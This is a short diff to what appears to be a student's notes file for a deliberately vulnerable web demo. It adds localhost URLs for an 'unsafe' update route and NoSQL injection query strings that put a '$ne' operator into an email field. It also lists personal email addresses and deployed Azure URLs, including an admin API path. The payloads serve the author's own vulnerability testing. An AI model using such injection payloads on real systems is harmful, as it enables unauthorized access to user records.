@@ -11,5 +11,26 @@ https://polite-field-09918cc00.4.azurestaticapps.net/#/update/67ea387f2c07bbf082
 
 https://internship-fta5hkg7e8eaecf7.westindia-01.azurewebsites.net/api/admin
 
+------------------------------
+vul1:
+
+http://localhost:5173/#/update/67ea387f2c07bbf082f4640f
+http://localhost:5173/#/update/unsafe/67ea387f2c07bbf082f4640f
+
 http://localhost:5000/test/
 http://localhost:5000/test/admin/
+
+------------------------------
+vul3:
+
+http://localhost:5000/demo/vuln/find?q={"email":"pdipen135@gmail.com"}
+
+http://localhost:5000/demo/vuln/find?q={"email":{"$ne":"cocply135@gmail.com"}}
+
+http://localhost:5000/demo/vuln/find?q={"email":{"$ne":"something"}}
+
+http://localhost:5000/demo/vuln/find?q={"email":{"$ne":"210305105302@paruluniversity.ac.in"}}
+
+
+
+
